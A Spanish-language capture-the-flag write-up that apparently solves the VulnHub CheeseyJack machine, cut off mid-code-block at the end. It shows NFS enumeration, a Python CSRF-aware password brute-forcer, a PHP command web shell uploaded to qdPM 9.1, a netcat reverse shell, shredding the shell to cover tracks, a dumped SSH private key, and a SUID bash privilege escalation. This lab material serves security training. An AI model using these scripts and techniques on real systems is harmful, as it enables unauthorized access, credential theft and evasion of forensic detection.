---
layout: single
title: Cheesey CheeseyJack - VulnHub
excerpt: "En esta ocasion vamos a estar resolviendo la maquina Cheesey: CheeseyJack de VulnHub donde vamos a estar enumerando el puerto 111 para crear una montura y ver que es lo que hay despues de eso vamos a estar empleando fuzzing para descubrir un panel de login y usando un diccionario personalizado de contraseñas lo vamos a usar para hacer un script en Python3 que haga fuerza bruta y nos diga cual es la contraseña usando diferentes tokens y ganar acceso al servicio ademas nos aprovecharemos de la version qdPM 9.1 para tener una reverse shell y para la escalada de privilegios tendremos que usar una clave ssh para ganar acceso como otro usuario y abusar de un privilegio de sudoers para ser root"
date: 2023-03-18
classes: wide
header:
  teaser: /assets/images/vh-writeup-cheesjack/icon.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
  - infosec
  - Spanish
tags:  
  - NFS Enumeration
  - Custom dictionary with cewl
  - Python Scripting
  - Brute Force
  - qdPM 9.1
  - Sudoers privilege
---

<p align="center">
<img src="/assets/images/vh-writeup-cheesjack/icon.png">
</p>

```bash
❯ arp-scan -I ens33 --localnet --ignoredups | grep VMware
192.168.1.93	00:0c:29:9f:7d:aa	VMware, Inc.
❯ whichSystem.py 192.168.1.93

192.168.1.93 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80,111,139,445,2049,33060,33881,34369,43937,44669 192.168.1.93 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-18 13:34 CST
Nmap scan report for 192.168.1.93
Host is up (0.00021s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 968424c807d0ec6351e0af28ef62dfaf (RSA)
|   256 7b2bf8339baf9a05e8a314eca9f7c16f (ECDSA)
|_  256 9d0e359c6aef2f85c0aa65de0725747f (ED25519)
80/tcp    open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: WeBuild - Bootstrap Coming Soon Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34369/tcp   mountd
|   100005  1,2,3      40761/udp   mountd
|   100005  1,2,3      41653/udp6  mountd
|   100005  1,2,3      44499/tcp6  mountd
|   100021  1,3,4      33881/tcp   nlockmgr
|   100021  1,3,4      34789/tcp6  nlockmgr
|   100021  1,3,4      59164/udp   nlockmgr
|   100021  1,3,4      60372/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
2049/tcp  open  nfs_acl     3 (RPC #100227)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
33881/tcp open  nlockmgr    1-4 (RPC #100021)
34369/tcp open  mountd      1-3 (RPC #100005)
43937/tcp open  mountd      1-3 (RPC #100005)
44669/tcp open  mountd      1-3 (RPC #100005)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.93%I=7%D=3/18%Time=64161240%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
MAC Address: 00:0C:29:9F:7D:AA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-03-18T19:34:38
|_  start_date: N/A
|_clock-skew: -2s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: CHEESEYJACK, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
```

```bash
❯ nmap --script=http-enum -p80 192.168.1.93 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-18 13:35 CST
Nmap scan report for 192.168.1.93
Host is up (0.0013s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /forms/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
MAC Address: 00:0C:29:9F:7D:AA (VMware)

```

## Enumeracion

```ruby
❯ whatweb http://192.168.1.93
http://192.168.1.93 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@cheeseyjack.loca,info@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.1.93], JQuery, Script, Title[WeBuild - Bootstrap Coming Soon Template]
```

Vemos el puerto `111` abierto

<a href='https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind' style='color: yellow'>Click para mas informacion sobre el puerto 111</a>

<a href='https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting' style='color: yellow'>Vamos a seguir enumerar usando las intrucciones de Hacktriks</a>

Hay un directorio

```bash
❯ showmount -e 192.168.1.93
Export list for 192.168.1.93:
/home/ch33s3m4n *
```

```bash
❯ mkdir /mnt/mounted
❯ mount -t nfs 192.168.1.93:/home/ch33s3m4n /mnt/mounted
❯ cd !$
cd /mnt/mounted
❯ ls
 Desktop   Documents   Downloads   Music   Pictures   Public   Templates   Videos

```

No hay claves `ssh` ni nada interesante 

```bash
❯ find . 2>/dev/null
.
./Templates
./Videos
./Desktop
./.bash_logout
./Documents
./.local
./.local/share
./.local/share/gvfs-metadata
./.local/share/applications
./.local/share/gnome-settings-daemon
./.local/share/gnome-settings-daemon/input-sources-converted
./.local/share/flatpak
./.local/share/flatpak/db
./.local/share/Trash
./.local/share/keyrings
./.local/share/evolution
./.local/share/sounds
./.local/share/gnome-shell
./.local/share/tracker
./.local/share/tracker/data
./.local/share/tracker/data/tracker-store.ontology.journal
./.local/share/tracker/data/tracker-store.journal
./.local/share/recently-used.xbel
./.local/share/icc
./.local/share/xorg
./.local/share/ibus-table
./.local/share/nautilus
./.local/share/nautilus/scripts
./.local/share/session_migration-ubuntu
./.gnupg
./.bashrc
./Public
./Music
./.ssh
./.cache
./.cache/event-sound-cache.tdb.a266734d00c245c1a316593e624e50a2.x86_64-pc-linux-gnu
./.cache/fontconfig
./.cache/fontconfig/a41116dafaf8b233ac2c61cb73f2ea5f-le64.cache-7
./.cache/fontconfig/CACHEDIR.TAG
./.cache/ubuntu-report
./.cache/ibus
./.cache/ibus/bus
./.cache/ibus/bus/registry
./.cache/evolution
./.cache/mozilla
./.cache/tracker
./.cache/tracker/db-version.txt
./.cache/tracker/locale-for-miner-apps.txt
./.cache/tracker/parser-version.txt
./.cache/tracker/ontologies.gvdb
./.cache/tracker/last-crawl.txt
./.cache/tracker/meta.db-wal
./.cache/tracker/meta.db
./.cache/tracker/no-need-mtime-check.txt
./.cache/tracker/db-locale.txt
./.cache/tracker/meta.db-shm
./.cache/tracker/first-index.txt
./.cache/ibus-table
./.cache/vmware
./.cache/libgweather
./.cache/gstreamer-1.0
./.cache/gstreamer-1.0/registry.x86_64.bin
./.cache/update-manager-core
./.cache/update-manager-core/meta-release-lts
./Downloads
./Downloads/qdPM_9.1.zip
./.bash_history
./.mozilla
./Pictures
./.config
./.profile

```

Vamos a eliminarlo

```bash
❯ cd /
❯ umount /mnt/mounted
```

Esta la web la parte de `Your Name` y `Your Email` no estan del todo funcionales

![](/assets/images/vh-writeup-cheesjack/Web1.png)

Vemos informacion util

![](/assets/images/vh-writeup-cheesjack/Web2.png)

Y no funciona

![](/assets/images/vh-writeup-cheesjack/Web3.png)

Si recordamos habiamos visto con `nmap` que hay un directorio `forms` 

![](/assets/images/vh-writeup-cheesjack/Web4.png)

Nada interesante

```bash
❯ curl http://192.168.1.93/forms/Readme.txt
Fully working PHP/AJAX contact form script is available in the pro version of the template.
You can buy it from: https://bootstrapmade.com/free-bootstrap-coming-soon-template-countdwon/
❯ curl http://192.168.1.93/forms/contact.php
Unable to load the "PHP Email Form" Library!                                                                                  ❯ curl http://192.168.1.93/forms/notify.php
Unable to load the "PHP Email Form" Library!
```

Vamos a aplicar `Fuzzing`

```bash
❯ gobuster dir -u http://192.168.1.93 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.93
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/18 14:13:33 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://192.168.1.93/assets/]
/forms                (Status: 301) [Size: 312] [--> http://192.168.1.93/forms/] 
/project_management   (Status: 301) [Size: 325] [--> http://192.168.1.93/project_management/]
/server-status        (Status: 403) [Size: 277]                                              
/it_security          (Status: 301) [Size: 318] [--> http://192.168.1.93/it_security/]       
                                                                                             
===============================================================
2023/03/18 14:14:28 Finished
===============================================================
```

Vemos un panel de login

![](/assets/images/vh-writeup-cheesjack/Web5.png)

Esta usando `qdPM 9.1`

![](/assets/images/vh-writeup-cheesjack/Web6.png)

Vulnerabilidades de la version

```bash
❯ searchsploit qdPM 9.1
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting                                | php/webapps/48486.txt
qdPM 9.1 - 'filter_by' SQL Injection                                                          | php/webapps/45767.txt
qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                                            | php/webapps/46399.txt
qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                                            | php/webapps/46387.txt
qdPM 9.1 - 'type' Cross-Site Scripting                                                        | php/webapps/46398.txt
qdPM 9.1 - Arbitrary File Upload                                                              | php/webapps/48460.txt
qdPM 9.1 - Remote Code Execution                                                              | php/webapps/47954.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)                                        | php/webapps/50175.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)                                   | php/webapps/50944.py
qdPM < 9.1 - Remote Code Execution                                                            | multiple/webapps/48146.py
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Teniamos un correo del usuario `ch33s3m4n` pero no concemos su contraseña

![](/assets/images/vh-writeup-cheesjack/Web7.png)

Vamos a emplear `burpsuite` para ver mas informacion

```bash
❯ burpsuite > /dev/null 2>&1 & disown
[1] 43594
```

Vamos a tambien a crearnos un diccionario para posibles contraseñas con `cewl`

```bash
❯ cewl http://192.168.1.93 -w diccionario.txt
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
❯ cewl http://192.168.1.93/project_management/ >> diccionario.txt
❯ cat diccionario.txt | wc -l
156
```

Si no empleamos repeticiones vemos que son menos

```bash
❯ cat diccionario.txt | sort -u | wc -l
149
```

Vamos a arreglarlo

```bash
❯ cat diccionario.txt | sort -u | sponge diccionario.txt
❯ cat diccionario.txt | wc -l
149
```

Vamos a interceptar esta peticion

![](/assets/images/vh-writeup-cheesjack/Web8.png)

Se esta enviando un `token`

![](/assets/images/vh-writeup-cheesjack/burp1.png)

```bash
❯ curl -s -X GET "http://192.168.1.93/project_management/" | grep token
<input type="hidden" name="login[_csrf_token]" value="b2330b6ad54d87acfcf12a9b573fc10d" id="login__csrf_token" />
```

Es dinamico 

```bash
❯ for i in $(seq 1 10); do curl -s -X GET "http://192.168.1.93/project_management/" | grep token | grep -oP '".*?"' | awk 'NR==3' | tr -d '"'; done
11f306e83d3f74d4e4c744e4819ecc0a
2722171f53a8fa00115624d5b63ff4e4
fab7288e2d31b01d83717776bad7bd39
0b0bfec4cee4aab0726aeb182fe01d0c
cce44b18acaf97051d751bd8b862b466
e4582daa199c0613cb117e5eab3cb071
6b1b18c4415639332cf5cc9c2c4d3df6
c3b383db50ba45686a366c8de53522d2
80b862f0f05b6c1dff73f99e597601ee
23e3ce6005899ff50bc418e15b1c54db
```

Vamos a usar `Python3` para hacer un script y saber la contraseña

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, pdb, re

def def_handler(sig, frame):

    print("\n\n[!] Saliendo..\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://192.168.1.93/project_management/index.php/login" # aqui esta el panel de autenticacion

def makeBruteForce(): # esta funciona hara la fuerza bruta
    
    f = open("passwords.txt", "r") # archivo con las contraseñas con capacidad de escritura

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque de Fuerza Bruta")

    time.sleep(2)

    counter = 1

    for password in f.readlines(): # bucle que recorre las contraseñas
        password = password.strip() # quitamos el salto de linea
    
        p1.status("Probando con la contraseña [%d/148]: %s " % (counter, password)) # te va el numero de contraseña que va probando y la contraseña

        s = requests.session() # declaramos una sesion

        r = s.get(login_url)

        token = re.findall(r'_csrf_token]" value="(.*?)"', r.text)[0]

        data_post = {
                'login[_csrf_token]': token,
                'login[email]': 'ch33s3m4n@cheeseyjack.local',
                'login[password]': password,
                'http_referer': 'http://192.168.1.93/project_management/'
        }

        r = s.post(login_url, data=data_post)

        if "No match" not in r.text:
            p1.success("La contraseña es %s" % password)
            sys.exit(0)

        counter += 1

if __name__ == '__main__':

    makeBruteForce()

```

```bash
❯ python3 brute_force.py
[+] Fuerza Bruta: La contraseña es qdpm
```

Ahora vamos a logearnos con la credenciales que ya tenemos

Esta es la web al logiarnos

![](/assets/images/vh-writeup-cheesjack/Web9.png)

Vamos a generar un proyecto para subir un `php`

![](/assets/images/vh-writeup-cheesjack/Web10.png)

```bash
❯ catn cmd.php
<?php
  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>

```

Una vez adjunto el archivo vamos a subirlo

![](/assets/images/vh-writeup-cheesjack/Web11.png)

Funciono

![](/assets/images/vh-writeup-cheesjack/Web12.png)

Vamos a hacer `Fuzzing` para ver donde nos guardo el archivo y hay un directorio `uploads`

```bash
❯ gobuster dir -u http://192.168.1.93/project_management -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.93/project_management
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/18 16:28:20 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 332] [--> http://192.168.1.93/project_management/images/]
/uploads              (Status: 301) [Size: 333] [--> http://192.168.1.93/project_management/uploads/]
```

Y funciona

![](/assets/images/vh-writeup-cheesjack/Web13.png)

Y funciona tambien 

![](/assets/images/vh-writeup-cheesjack/Web14.png)

Ahora vamos a ganar acceso ala maquina

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Y le das al enter

![](/assets/images/vh-writeup-cheesjack/Web15.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.94] from (UNKNOWN) [192.168.1.93] 35256
bash: cannot set terminal process group (78306): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cheeseyjack:/var/www/html/project_management/uploads/attachments$ whoami
<html/project_management/uploads/attachments$ whoami                       
www-data
www-data@cheeseyjack:/var/www/html/project_management/uploads/attachments$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cheeseyjack:/var/www/html/project_management/uploads/attachments$ 
```

Ahora has esto para una mejor shell y hacer `CTRL+C`

```bash
script /dev/null -c bash
CTRL+Z
reset xterm
ENTER
export TERM=xterm
```

## Escalada de privilegios

Vamos a borrar el archivo para no dejar rastro aunque tambien debemos de borrar los logs

```bash
www-data@cheeseyjack:/var/www/html/project_management/uploads/attachments$ shred -zun 15 -v 593494-cmd.php
shred: 593494-cmd.php: pass 1/16 (random)...
shred: 593494-cmd.php: pass 2/16 (492492)...
shred: 593494-cmd.php: pass 3/16 (b6db6d)...
shred: 593494-cmd.php: pass 4/16 (249249)...
shred: 593494-cmd.php: pass 5/16 (random)...
shred: 593494-cmd.php: pass 6/16 (924924)...
shred: 593494-cmd.php: pass 7/16 (aaaaaa)...
shred: 593494-cmd.php: pass 8/16 (random)...
shred: 593494-cmd.php: pass 9/16 (ffffff)...
shred: 593494-cmd.php: pass 10/16 (000000)...
shred: 593494-cmd.php: pass 11/16 (db6db6)...
shred: 593494-cmd.php: pass 12/16 (random)...
shred: 593494-cmd.php: pass 13/16 (555555)...
shred: 593494-cmd.php: pass 14/16 (6db6db)...
shred: 593494-cmd.php: pass 15/16 (random)...
shred: 593494-cmd.php: pass 16/16 (000000)...
shred: 593494-cmd.php: removing
shred: 593494-cmd.php: renamed to 00000000000000
shred: 00000000000000: renamed to 0000000000000
shred: 0000000000000: renamed to 000000000000
shred: 000000000000: renamed to 00000000000
shred: 00000000000: renamed to 0000000000
shred: 0000000000: renamed to 000000000
shred: 000000000: renamed to 00000000
shred: 00000000: renamed to 0000000
shred: 0000000: renamed to 000000
shred: 000000: renamed to 00000
shred: 00000: renamed to 0000
shred: 0000: renamed to 000
shred: 000: renamed to 00
shred: 00: renamed to 0
shred: 593494-cmd.php: removed
```

Esto es interesante

```bash
www-data@cheeseyjack:/home$ cd crab/
www-data@cheeseyjack:/home/crab$ ls -l
total 16
drwxrwxr-x 2 crab crab 4096 Sep 24  2020 Desktop
drwxrwxr-x 2 crab crab 4096 Sep 24  2020 Documents
drwxrwxr-x 2 crab crab 4096 Sep 24  2020 Videos
-rw-r--r-- 1 crab crab  179 Oct 10  2020 todo.txt
www-data@cheeseyjack:/home/crab$ cat todo.txt 
1. Scold cheese for weak qdpm password (done)
2. Backup SSH keys to /var/backups
3. Change cheese's weak password
4. Milk
5. Eggs
6. Stop putting my grocery list on my todo lists
www-data@cheeseyjack:/home/crab$ 
```

Nos estan diciendo donde estan las claves `ssh`

```bash
www-data@cheeseyjack:/home/crab$ cd /var/backups/
www-data@cheeseyjack:/var/backups$ ls
alternatives.tar.0     dpkg.arch.0     dpkg.diversions.0     dpkg.statoverride.0     dpkg.status.0     ssh-bak
alternatives.tar.1.gz  dpkg.arch.1.gz  dpkg.diversions.1.gz  dpkg.statoverride.1.gz  dpkg.status.1.gz
apt.extended_states.0  dpkg.arch.2.gz  dpkg.diversions.2.gz  dpkg.statoverride.2.gz  dpkg.status.2.gz
www-data@cheeseyjack:/var/backups$ cd ssh-bak/
www-data@cheeseyjack:/var/backups/ssh-bak$ ls
key.bak
www-data@cheeseyjack:/var/backups/ssh-bak$    
```

```bash
www-data@cheeseyjack:/var/backups/ssh-bak$ cat key.bak 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Vamos a tratar de migrar al otro usuario utilizando esa clave `ssh`

```bash
www-data@cheeseyjack:/var/backups/ssh-bak$ ssh -i key.bak crab@localhost
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:8Szxls/qRsC4wKThvZfU4u+NiAmeWmTfTirhBNl3kXA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


180 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Your Hardware Enablement Stack (HWE) is supported until April 2025.
*** System restart required ***
Last login: Thu Sep 24 16:48:34 2020 from 172.16.24.128
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

crab@cheeseyjack:~$ whoami
crab
crab@cheeseyjack:~$ 
```

Estamos en `sudo`  pero no sabemos la contraseña

```bash
crab@cheeseyjack:~$ id
uid=1001(crab) gid=1001(crab) groups=1001(crab),27(sudo)
crab@cheeseyjack:~$ 
```

Podemos ejecutar cualquier binario dentro de esa ruta

```bash
crab@cheeseyjack:~$ sudo -l
Matching Defaults entries for crab on cheeseyjack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User crab may run the following commands on cheeseyjack:
    (ALL : ALL) ALL
    (root) NOPASSWD: /home/crab/.bin/
crab@cheeseyjack:~$ 
```

Vamos a asignar permisos `SUID` ala `bash` tenemos que capacidad de escritura en la ruta

```bash
crab@cheeseyjack:~$ cd /home/crab/.bin/
crab@cheeseyjack:~/.bin$ touch xd
crab@cheeseyjack:~/.bin$ chmod +x xd
crab@cheeseyjack:~/.bin$ nano xd 
crab@cheeseyjack:~/.bin$ cat xd 
#!/bin/bash

chmod u+s /bin/bash
crab@cheeseyjack:~/.bin$ 
```

Ahora es `SUID`

```bash
